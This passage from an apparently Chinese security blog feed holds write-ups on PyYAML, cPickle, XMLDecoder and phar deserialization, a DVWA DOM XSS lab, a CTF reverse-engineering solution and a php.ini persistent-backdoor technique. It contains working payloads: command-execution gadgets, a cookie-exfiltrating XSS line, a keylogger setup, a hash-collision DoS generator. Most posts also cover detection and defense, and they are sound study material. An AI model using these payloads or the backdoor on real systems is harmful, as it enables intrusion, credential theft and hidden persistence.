例如，查询内核的text段所映射的物理内存位置，通过搜索Kernel便可以查看code/text段、data段和bss段的内容： ECFSExtended Core File Snapshot扩展核心文件快照，是一种核心转储技术，专门为进程镜像的高级取证分析所设计。可从该URL下载：https://github.com/elfmaster/ecfs 链接器相关环境指针LD_PRELOAD环境变量LD_PRELOAD环境变量可以设置成一个指定库的路径，动态链接时较其他库有着更高的优先级，允许预加载指定库中的函数和符号覆盖掉后续链接的库中的函数和符号。即可以通过重定向共享库函数来进行运行时修复。这项技术可用于绕过反调试代码，也可以用作用户机rootkit。 CTF中有示例参考HITB Binary 100。 LD_SHOW_AUXV环境变量LD_SHOW_AUXV环境变量能够通知程序加载器来展示程序运行时的辅助向量。辅助向量是放在程序栈上的信息（通过内核的ELF常规加载方式），附带了传递给动态链接器的程序相关的特定信息。 链接器脚本链接器脚本由链接器解释，把程序划分为节、内存和符号。gcc通过使用-T参数来指定链接器脚本。默认的链接器脚本可以使用ld –verbose命令查看：]]></content>
      <categories>
        <category>二进制基础</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python PyYAML反序列化漏洞]]></title>
    <url>%2F2019%2F01%2F01%2FPyYAML%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[基本概念（引用百度）YAML是“YAML不是一种标记语言”的外语缩写；但为了强调这种语言以数据做为中心，而不是以置标语言为重点，而用返璞词重新命名。它是一种直观的能够被电脑识别的数据序列化格式，是一个可读性高并且容易被人类阅读，容易和脚本语言交互，用来表达资料序列的编程语言。 PyYAML是Python中YAML语言的编辑器和解释器。 安装：pip install PyYAML 两个函数： yaml.dump()：将一个Python对象序列化生成为yaml文档。 yaml.load()：将一个yaml文档反序列化为一个Python对象。 简单的用例： 可以看到，User对象经过yaml序列化之后内容为一行字符串，简单解释一下：“!!pythonobject”为yaml标签，yaml.load()会识别该标签并调用相应的方法执行反序列化操作；冒号后面的“__main__”为py文件名，这里为本文件的意思；“User”为序列化的对象类型，后面紧跟的大括号即为该对象的属性及其属性值。 更详细的说明可参考官方文档。 Demo这里编写简单的Demo，一个py文件用于将恶意类序列化为字符串保存到yaml文件中，另一个py文件用于反序列化yaml文件内容为恶意类对象从而达到利用反序列化漏洞的目的。 yaml_test.py先创建一个poc对象再调用yaml.dump()将其序列化为一个字符串，其中第10行代码为将默认的“__main__”替换为该文件名“yaml_test”，目的是为了后面yaml.load()反序列化该字符串的时候会根据yaml文件中的指引去读取yaml_ test.py中的poc这个类，否则无法正确执行： yaml_test2.py直接yaml.load()读取目标yaml文件，由!!python/object标签解析其中的名为yaml_test的module中的poc类，最后执行了该类对象的__init__()方法从而执行了命令： 漏洞根源分析到$PYTHON_HOME/lib/site-packages/yaml/constructor.py中查看3个特殊Python标签的源码。 !!python/object标签： !!python/object/new标签： !!python/object/apply标签： 可以看到，!!python/object/new标签的代码实现其实就是!!python/object/apply标签的代码实现，只是最后newobj参数值不同而已。这3个Python标签中都是调用了make_python_instance()函数，查看该函数： 可以看到，在该函数是会根据参数来动态创建新的Python类对象或通过引用module的类创建对象，从而可以执行任意命令。 通用payload只要存在yaml.load()且参数可控，则可以利用yaml反序列化漏洞，payload列举如下，当然不止如下： 附上测试代码： 1234567891011import yamlpayload = '!!python/object/apply:subprocess.check_output [[calc.exe]]'#payload = '!!python/object/apply:subprocess.check_output ["calc.exe"]'#payload = '!!python/object/apply:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/apply:os.system ["calc.exe"]'#payload = '!!python/object/new:subprocess.check_output [["calc.exe"]]'#payload = '!!python/object/new:os.system ["calc.exe"]'yaml.load(payload) 一个疑问点？为什么“!!python/object”标签不好使，明明Demo用的是这个标签，但通用payload中无法执行该payload？看了一些网上的文章也没有分析原因，其实查看官方文档就知道怎么回事了： 可以看到，!!python/object标签的使用格式和另外两个根本就是两码事，其接收参数是使用大括号{}而非中括号[]，且并没有对参数args进行接收。也就是说，!!python/object标签只针对于对象类进行使用。 检测方法全局搜索Python代码中是否包含“import yaml”，若包含则进一步排查是否调用yaml.load()且参数是可控的。 防御方法使用安全函数yaml.safe_load()替代yaml.load()即可。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python安全小工具之反编译pyc文件]]></title>
    <url>%2F2019%2F01%2F01%2FPython%E5%AE%89%E5%85%A8%E5%B0%8F%E5%B7%A5%E5%85%B7%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91pyc%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[有时需要查看某个Python Web目录内Python源码，但dump下来只有pyc文件而没有py文件，这时需要我们反编译pyc文件为py文件。为了方便就写个脚本遍历目录内的pyc文件并进行反编译。 1234567891011121314151617181920212223242526272829303132#coding=utf-8import osimport sysimport uncompyle6def Decompile(path): if os.path.exists(path): for parent,dirs,files in os.walk(path): for file in files: file_name,ext = os.path.splitext(file) if ext == ".pyc": file_path = os.path.join(parent,file) print "[*]Decompiling:", file_path cmd = "uncompyle6 " + file_path + " &gt; " + parent + "\\" + file_name + ".py" try: os.system(cmd) print "[+]Decompile successful.\n" except Exception as e: print e print "[*]Finished." else: print "[-]Wrong Directory Path."def main(): if len(sys.argv) != 2: print "[*]Usage: python decompile.py [Directory Path]" else: path = sys.argv[1] Decompile(path)if __name__ == "__main__": main() 运行效果：]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>安全开发</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[DVWA之DOM型XSS]]></title>
    <url>%2F2019%2F01%2F01%2F%E9%80%9A%E8%BF%87DVWA%E5%AD%A6%E4%B9%A0DOM%E5%9E%8BXSS%2F</url>
    <content type="text"><![CDATA[下了个新版的DVWA看了下，发现新增了好几个Web漏洞类型，就玩一下顺便做下笔记，完善一下之前那篇很水的DOM XSS文章，虽然这个也很水 ：） 基本概念DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞，其触发不需要经过服务器端，也就是说，服务端的防御并不起作用。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 可能触发DOM型XSS的属性document.referer属性 window.name属性 location属性 innerHTML属性 documen.write属性 ······ Low级别点击正常功能观察： 查看页面源码，可以看到以下框中的JS代码，从URL栏中获取default参数的值，这里是通过获取“default=”后面的字符串来实现的，然后直接写到option标签中，并没有对特殊字符进行任何的过滤： 可以明确，这是由document.write属性造成的DOM型XSS漏洞。 因为这段JS代码是本地执行的，获取本地输入的URL栏上的default参数再直接嵌入到option标签中的，因而可以直接往default参数注入XSS payload即可： \alert(document.cookie)\ 检测元素，可以看到是通过JS在本地动态执行嵌入了script标签： 若要尝试使用其他XSS payload，如img、svg等标签，因为select标签内只允许内嵌option标签，而option标签中能内嵌script标签但不能内嵌img等标签，因此需要在注入时先闭合option和select标签从而使注入的标签逃逸出来执行XSS： \\\&lt;img src=x onerror=alert(“SKI12”)&gt; 最后查看源码，没有做任何防御： Medium级别先尝试payload：\alert(document.cookie)\ 发现会重定向到English选项页面。 推测可能是对script字符串进行了过滤，因此进行重复内嵌或大小写组合等方式尝试绕过： \&lt;scri\pt&gt;alert(document.cookie)\&lt;/sc\ript&gt; \alert(document.cookie)\ 然而发现也是会重定向到English选项页面。 应该是对script标签进行了比较严格的过滤， 换个标签类型的payload（注意要闭合前面的标签如low级所说）： \\\&lt;svg/onload=alert(document.cookie)&gt; 弹框成功： 因此可以推测，后台代码只是对script标签进行了有效的过滤，而对于其他标签则未进行过滤。 最后查看源码，发现只对script标签进行了过滤，过滤方式是调用stripos()函数获取“\&lt;script”字符串出现在参数的哪个位置（不区分大小写），因此重复内嵌和大小写等方式无法绕过该过滤机制： High级别经过一系列XSS payload的尝试，没有成功 : ( 没办法，看下源码吧： 发现已经白名单写死了，推测是不是存在某种截断可以使得XSS得以注入弹框。 试了一会并未成功，无奈查看一下help提示： The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server. Spoiler: The fragment section of a URL (anything after the # symbol) does not get sent to the server and so cannot be blocked. The bad JavaScript being used to render the page reads the content from it when creating the page. 大概意思就是，需要找一种方法在本地运行你的JS代码而无需经过服务器端的处理。这里提供的一种方法就是，应用#号，URL栏的#号之后的内容并不会发送至服务器端，JS应用该符号实现在页面创建加载过程中定向到指定的页面内容上。 试一下在白名单字符串后添加#号的payload，刚输入进去是无反应的，需要刷新一下触发JS中#号的作用才能弹框： English#\\\ Impossible级别直接看源码吧： 说是服务器端不需要做任何防御措施，防御的关键在于客户端上。 查看help怎么说： The contents taken from the URL are encoded by default by most browsers which prevents any injected JavaScript from being executed. 大致就是，大多数浏览器默认都对从URL中获取的内容进行编码，以防止JS代码注入执行。 回到xss dom的index.php中可以看到，对于impossible级别来说，在JS代码document.write()中调用的decodeURI()是个空函数，即并不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS： 测试一下，注入payload，发现确实没有进行URL解码： 漏洞利用和之前写的《关于DOM型XSS漏洞的学习笔记》一样，将其重复整理到一起吧。 测试的level是low，其他level同理。 窃取cookie——createElement()利用JS的document.createElement()创建新标签如img并将cookie信息通过img标签src属性来请求发往目标主机，payload如下： /xss_d/?default=\var img=document.createElement(“img”);img.src=”http://127.0.0.1:8000/a?&quot;+escape(document.cookie);\ 篡改页面——innerHTML主要用于篡改页面，payload如下： /xss_d/?default=\document.body.innerHTML=”\\DOM XSS By SKI12\\“;\ 键盘记录——document.onkeypress利用document.onkeypress可实现键盘记录。 keylogger.js 放置于攻击者的服务器中，让目标服务器注入XSS后来访问执行。 keylogger.php 放置于攻击者的服务器中，用于接收目标服务器访问执行了keylogger.js后传送回来的用户输入的键盘信息，并保存在本地文件中。 payload： /xss_d/?default=\\ 此时用户在该Web界面输入的任何内容都会实时保存到keylog.txt中： 防御DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到\则进行JS编码。]]></content>
      <categories>
        <category>WriteUp:Web</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>XSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HITB Binary 100 writeup]]></title>
    <url>%2F2019%2F01%2F01%2FHITB_Binary_100_writeup%2F</url>
    <content type="text"><![CDATA[HITB Binary 100是之前的HITB CTF的一道简单的逆向题，这里简单做一遍。 下载hitb-bin100.elf 将elf文件先跑一下，发现像歌词播放一样、每个一秒钟左右输出一句话，歌词好像没啥用，而且运行很久也还没停下来： 根据字符串检索法，扔到IDA的String窗口查看是否存在关键字符串，可以看到有“FLAG”相关的字符串： 点击进去查看，发现这段代码是在main()函数中的： 接着查看一下该二进制文件的函数等信息： 在Function Window也可以看到，除了调用一些标准库的函数，整个程序几乎都编译到了main函数中： 查看main函数的汇编代码，可以看到有两个地址值得研究，即4007e8和400803，因为其中都是会调用printf函数输出内容： 直接在GDB上运行并jump到相应的地址查看： 可以看到，KEY是正常的输出出来了，但是FLAG输出的是一堆乱码，然后就出现“stack smashing detected”的错误而终止运行了。跳过去直接输出Flag是不可能的了。 F5看一下伪代码吧，看到在输出flag前一段主要的代码： 分析可知，v20变量存放的是该循环执行的次数、无法改变；v21变量调用time函数生成一个时间戳，用于后续与v6变量的相减形成随机种子值；v11变量用于内循环执行的次数，从0-36；v6变量同样调用time函数生成一个时间戳，与v21变量不同在于每次内循环结束后重新生成时间戳时都会先sleep 1s后再生成；在内循环的最后是一个sleep()函数，调用来休眠1s；其余的代码都是用于生成输出的字符串。 这里如果想直接nop掉sleep()函数是行不通的，因为整段代码的执行依赖于该sleep()函数，v6与v21的差值在每次内循环结束的时候都会通过sleep()函数实现增一，如果不这样正常处理，将得不到正常的flag。 换个思路，这里关键的两个函数是sleep()和time()，我们可以重新定义该两个函数，通过LD_PRELOAD预先加载这两个函数而不是调用系统自己的从而实现欺骗程序该代码确实是睡眠了1s了，也就是说，自定义的sleep()函数直接对时间变量t自增1而不是真的等待了一秒才运行结束，从而可以将程序的休眠时间去掉： gcc编译为so文件（-fpic参数指定为位置无关、即使用相对地址，-shared参数指定为共享库），再通过LD_PRELOAD在该elf程序运行前优先加载生成的动态链接库time.so并管道输出到一个文件中查看，可以看到输出了flag：]]></content>
      <categories>
        <category>WriteUp:Reverse</category>
      </categories>
      <tags>
        <tag>二进制</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows下的一种PHP隐藏后门姿势]]></title>
    <url>%2F2019%2F01%2F01%2FWindows%E4%B8%8B%E7%9A%84%E4%B8%80%E7%A7%8DPHP%E9%9A%90%E8%94%BD%E5%90%8E%E9%97%A8%E5%A7%BF%E5%8A%BF%2F</url>
    <content type="text"><![CDATA[在Windows中的PHP解释环境中有两个函数能够自动加载文件，即auto_prepend_file和auto_append_file，其在php.ini中可修改成任意文件，可为PHP或DLL文件。将后门代码写入这两个文件，再修改include_path为后门文件的绝对路径，则Web站点下所有的PHP文件都可以作为PHP后门。 1、修改auto_prepend_file和auto_append_file： 在php.ini中找到这两个配置项，去掉注释，添加上后门文件名，如： 2、修改include_path： 在php.ini中找到该配置项，注意是Windows版本的，去掉注释并添加后门文件所在的绝对路径，如下： 3、创建后门文件： 在include_path指示的路径上创建auto_prepend_file和auto_append_file指定文件名的两个后门文件，如下： 之后直接使用菜刀带上密码访问Web站点任意一个PHP页面即可获取shell：]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java XMLDecoder反序列化漏洞]]></title>
    <url>%2F2019%2F01%2F01%2FXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[基本概念XMLDecoder用于将XMLEncoder创建的xml文档内容反序列化为一个Java对象，其位于java.beans包下。 影响版本XMLDecoder在JDK 1.4~JDK 11中都存在反序列化漏洞安全风险。 Demo1234567891011121314151617181920212223242526272829303132333435363738394041import com.sun.beans.decoder.DocumentHandler;import org.xml.sax.helpers.DefaultHandler;import javax.xml.parsers.SAXParser;import javax.xml.parsers.SAXParserFactory;import java.io.BufferedInputStream;import java.io.File;import java.io.FileInputStream;import java.beans.XMLDecoder;public class test &#123; public static void XMLDecode_Deserialize(String path) throws Exception &#123; File file = new File(path); FileInputStream fis = new FileInputStream(file); BufferedInputStream bis = new BufferedInputStream(fis); XMLDecoder xd = new XMLDecoder(bis); xd.readObject(); xd.close(); &#125; public static void main(String[] args)&#123; //XMLDecode Deserialize Test String path = "poc.xml"; try &#123; XMLDecode_Deserialize(path);// File f = new File(path);// SAXParserFactory sf = SAXParserFactory.newInstance();// SAXParser sp = sf.newSAXParser();//// DefaultHandler dh = new DefaultHandler();// DocumentHandler dh = new DocumentHandler();// sp.parse(f, dh); &#125; catch (Exception e) &#123; e.printStackTrace(); &#125; &#125;&#125; Payload： poc.xml，可以看到java标签的class属性指定XMLDecoder类，对象标签指定ProcessBuilder类、void标签指定方法为start，即可调用ProcessBuilder.start()来执行其中的命令。 1234567891011&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;java version="1.8.0_131" class="java.beans.XMLDecoder"&gt; &lt;object class="java.lang.ProcessBuilder"&gt; &lt;array class="java.lang.String" length="1"&gt; &lt;void index="0"&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method="start" /&gt; &lt;/object&gt;&lt;/java&gt; 运行后，会弹出计算器： 调试分析在IDEA下设置断点跟踪调试。 在readObject()处设置断点，可看到XMLDecoder对象xd的input属性包含了输入XML文档的路径： 继续往里调试，调用到XMLDecoder.parsingComplete()时，发现里面调用了 XMLDecoder.this.handler.parse()，其中this.handler即为DocumentHandler，换句话说，就是调用了DocumentHandler.parser()来解析输入的XML文档内容： 跟踪进去，可以看到DocumentHandler.parser()中调用了如下函数来解析XML内容： 1SAXParserFactory.newInstance().newSAXParser().parse() 接着设置xmlReader的相关handler，如处理XML内容、实体、错误、文档类型定义、文件等句柄，最后调用xmlReader.parse()解析XML文件内容： 继续调试，在XML11Configuration.parse()中发现调用determineDocVersion()： 跟踪进去发现，determineDocVersion()主要获取XML实体扫描器然后扫描解析\&lt;?xml version=…?&gt;来获取XML文档的版本信息： 返回版本信息后，继续往下在XML11Configuration.parse()中调用startDocumentParsing()函数，主要是重置扫描器的版本配置并开始文件扫描准备，其中开始文件扫描准备是调用startEntity()函数（跟踪进去可以看到是通知扫描器开始实体扫描，其中文档实体的伪名称为“[xml]”、DTD的伪名称为“[dtd]”、参数实体名称以“%”开头；接着函数内部会调用startDocument()函数开始准备文件扫描）： 可以看到最后调用到的startDocument()函数会清空当前对象和句柄为文件扫描的开始做准备： 返回到XML11Configuration.parse()中继续往下调试，调用scanDocument()开始文件扫描： 进入scanDocument()，可以看到设置实体句柄后，主要是执行do while循环体，其中的包含START_DOCUMENT、START_ELEMENT、CHARACTERS、SPACE、ENTITY_REFERENCE、PROCESSING_INSTRUCTION、COMMENT、DTD、CDATA、NOTATION_DECLARATION、ENTITY_DECLARATION、NAMESPACE、ATTRIBUTE、END_ELEMENT等的扫描识别： 中间XML节点解析的过程不用过多分析，调试至END_ELEMENT时，可以看到其中提取出“calc”参数值： 跟踪进去后面的getValueObject()函数，可以看到变量var3和var4，分别为获取到ProcessBuilder类名和start方法名，在调用Expression()： 继续跟踪到里面，最后会调用MethodUtil.invoke()方法实现反射执行任意类方法： 再次F7直接执行了代码弹出计算器： 整体地看一下，整个调用过程大致如下： 1XMLDecoder.readObject() -&gt; XMLDecoder.parsingCompelete() -&gt; DocumentHandler.parse() -&gt; SAXParserFactory.newInstance().newSAXParser().parse() -&gt; xmlReader.parse() 可以发现，XMLDecoder类解析XML是调用DocumentHandler类实现的，而DocumentHandler类是基于SAXParser类对XML的解析上的。 那么可以去分析一下，到底哪个类才是真正的漏洞类。测试一下，可以看出DocumentHandler类才是XMLDecoder反序列化漏洞的根源类： 检测方法全局搜索XMLDecoder关键字，排查是否调用readObject()函数且参数是否可控。 防御方法若可以尽量不使用XMLDecoder反序列化XML内容；若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python cPickle反序列化漏洞]]></title>
    <url>%2F2019%2F01%2F01%2FcPickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[基本概念Python中有个库可以实现序列化和反序列化操作，名为pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。 cPickle可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个函数： cPickle.dump()：将Python对象序列化保存到本地的文件中。 cPickle.load()：载入本地文件，将文件内容反序列化为Python对象。 cPickle.dumps()：将Python对象序列化为字符串。 cPickle.loads()：将字符串反序列化为Python对象。 简单示例： 先创建Person类对象并初始化，然后将其序列化并输出，可以看到是C解释过的内容： 为了方便，直接在该代码下面添加反序列化操作： Demo还是用上面的示例，添加一个__reduce__()魔术方法： 漏洞根源分析漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。 简单说明一下__reduce__()函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。 由于cPickle是C写的代码且pickle与其实现原理一致，所以到$PYTHON_HOME/Lib/pickle.py中查看reduce加载的源码： 通过调试可以发现，第1136行将当前栈内容赋值给stack变量，当前栈内容包含我们输入的恶意的os.system(“calc.txt”)内容，接着出栈赋值给args变量；通常函数返回地址都保存在当前EBP寄存器所指的上方，因此通过stack[-1]可以获取返回函数地址并赋值给func变量；最后调用func(*args)传入特定参数执行函数，从而完成对象的调用解析而执行任意命令。 通用payload因为反序列化之后用到的库需要在反序列化的文件中存在，所以这里简单分为未导入和导入目标模块即这里为os模块的情况，当然除此之外还有其他一些系统执行库、其他的姿势等等，可自行补充，后面有空再补上吧： 这里贴上测试代码： 12345678910111213141516171819202122232425#coding=utf-8import cPickleclass Person(object): def __init__(self,username,password): self.username = username self.password = password def __reduce__(self): # 未导入os模块，通用 return (__import__('os').system, ('calc.exe',)) # return eval,("__import__('os').system('calc.exe')",) # return map, (__import__('os').system, ('calc.exe',)) # return map, (__import__('os').system, ['calc.exe']) # 导入os模块 # return (os.system, ('calc.exe',)) # return eval, ("os.system('calc.exe')",) # return map, (os.system, ('calc.exe',)) # return map, (os.system, ['calc.exe'])admin = Person('admin','123456')result = cPickle.dumps(admin)user = cPickle.loads(result) 检测方法全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 防御方法1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法； 2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。]]></content>
      <categories>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[phar反序列化漏洞]]></title>
    <url>%2F2019%2F01%2F01%2Fphar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[之前做CTF遇到phar反序列化漏洞概念，这里小结一下。 基本概念phar (PHP Archive) 是PHP里类似于Java中jar的一种打包文件，用于归档。当PHP 版本&gt;=5.3时默认开启支持PHAR文件的。 phar文件默认状态是只读，使用phar文件不需要任何的配置。 而phar://伪协议即PHP归档，用来解析phar文件内容。 phar文件结构1、stub 一个供phar扩展用于识别的标志，格式为xxx\&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2、manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。 3、contents 被压缩文件的内容。 4、signature 签名，放在文件末尾，格式如下： ###phar使用Demo 注意：生成phar文件需要修改php.ini中的配置： phar.php 123456789101112131415&lt;?php class User&#123; var $name; &#125; @unlink("SKI12.phar"); $phar = new Phar("SKI12.phar"); $phar-&gt;startBuffering(); $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); $o = new User(); $o-&gt;name = "Kobe"; $phar-&gt;setMetadata($o); $phar-&gt;addFromString("test.txt", "test"); $phar-&gt;stopBuffering();?&gt; 使用WinHex查看该phar文件，可以看到前面是stub，接着是manifest，包含以序列化的形式存储用户自定义的meta-data信息即这里的User类对象： phar_parse.php 123456789101112&lt;?php class User &#123; var $name; function __destruct()&#123; echo $this-&gt;name; &#125; &#125; $filename = 'phar://SKI12.phar/test.txt'; file_exists($filename);?&gt; 为了验证使用phar://伪协议解析phar文件时对meta-data进行反序列化操作，这里添加__destruct()魔法函数进行输出验证： 漏洞点phar反序列化漏洞的漏洞点在于使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化；当Metadata内容可由用户控制，则会存在反序列化漏洞风险。 受影响的PHP文件操作函数列表如下： 在php-src/ext/phar/phar.c中可以查看到phar在解析metadata时会调用php_var_unserialize()函数来对metadata进行反序列化操作： 利用条件 能够上传phar文件到服务器，可将phar文件伪装成其他格式文件绕过上传； 要有可用的魔术方法作为“跳板”； 文件操作函数的参数可控，且:、/、phar等特殊字符未被过滤。Demo1——反序列化任意代码执行 这种情况利用条件较为苛刻，需要有可用的魔术方法，在实际场景较为少见，多见于CTF比赛。 phar1.php 将恶意代码注入到对象中并在设置Metadata信息中实现序列化。 12345678910111213141516&lt;?php class User&#123; var $data; &#125; @unlink("SKI12.phar"); $phar = new Phar("SKI12.phar"); $phar-&gt;startBuffering(); $phar-&gt;setStub("&lt;?php __HALT_COMPILER(); ?&gt;"); $o = new User(); $o-&gt;data = "phpinfo()"; // $o-&gt;data = "whoami"; $phar-&gt;setMetadata($o); $phar-&gt;addFromString("test.txt", "test"); $phar-&gt;stopBuffering();?&gt; 使用WinHe查看该phar文件，可以看到注入的代码在序列化后的Metadata信息中： phar2.php 可利用的魔术方法有__destruct()和__wakeup()等。 通过GET方法的形式控制文件操作函数的参数，并且存在可利用的魔法函数。 1234567891011121314&lt;?php $filename = $_GET['file']; class User &#123; var $data; public function __wakeup() &#123; eval("$this-&gt;data;"); // system($this-&gt;data); &#125; &#125; file_exists($filename); ?&gt; PHP代码执行： 或系统命令执行： Demo2——PHP内核哈希表碰撞攻击相比于上一种利用方式，这种不需要苛刻的有可用的魔术方法的条件只需可控参数的文件操作函数的条件即可。在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1) =&gt; O(n)）来触发拒绝服务攻击。 PHP修复此漏洞的方式是限制通过$_GET或$_POST等方式传入的参数数量，但是如果PHP脚本通过json_decode()或unserialize()等方式获取参数，依然将受到此漏洞的威胁。 phar_dos.php 生成恶意DoS phar文件。 1234567891011121314151617&lt;?php $size= pow(2, 16); $array = array(); for ($key = 0, $maxKey = ($size - 1) * $size; $key &lt;= $maxKey; $key += $size) &#123; $array[$key] = 0; &#125; $obj = new stdClass; $obj-&gt;dos = $array; $phar = new Phar("dos.phar"); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); $phar-&gt;setMetadata($obj); $phar-&gt;addFromString("dos.txt", "dos"); $phar-&gt;stopBuffering();?&gt; 使用WinHex查看该phar文件，可以看到Metadata信息中序列化的内容为含有大量元素的数组： phar_dos_attack.php 这里直接通过执行先后的时间差进行测试，通过GET方法的形式控制文件操作函数的参数。 1234567&lt;?php $filename = $_GET['file']; $startTime = microtime(true); file_exists($filename); $endTime = microtime(true); echo 'PHP内核哈希表碰撞DoS攻击造成的延迟时间： '.($endTime - $startTime). ' 秒';?&gt; 直接通过GET方法传入file参数的值，可看到延迟响应的时间相当长： Demo3——绕过文件幻数检测文件幻数检测：主要是检测文件内容开始处的文件幻数，要绕过的话需要在文件开头写上检测的值。 PHP识别phar文件是通过其文件头的stub中的__HALT_COMPILER();?&gt;这段代码，对于其前面的内容和后缀名都没有校验，因此可以通过添加任意的文件头以及修改后缀名的方式将phar文件伪装成其他格式的文件从而绕过文件幻数检测。 生成和解析phar文件的代码和Demo1的一致，区别在于生成phar文件的代码中的setStub()函数前面添加伪造其他格式文件的标志性内容。另外注意的是Phar()函数内的文件名后缀只能写phar，生成后再修改该phar文件后缀名为其他文件格式的后缀名。 这里以GIF文件为示例。 WinHex查看一个正常的GIF图，可以看到一个正常的GIF文件其文件幻数为GIF89a： 在setStub()中内容的开头添加GIT89a： 将生成的SKI12.phar修改为SKI12.gif，使用WinHex查看： 这里直接访问该文件，至于绕过文件格式检测的环境可自行搭建测试一下即可： 防御 在文件系统函数的参数可控时，对参数进行严格的过滤； 严格检查上传文件的内容，而不是只检查文件头； 在条件允许的情况下禁用可执行系统命令、代码的危险函数； 参考blackhat议题深入 | phar反序列化 利用 phar 拓展 php 反序列化漏洞攻击面]]></content>
      <categories>
        <category>PHP</category>
      </categories>
      <tags>
        <tag>Web安全</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP unserialize反序列化漏洞]]></title>
    <url>%2F2019%2F01%2F01%2FPHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%2F</url>
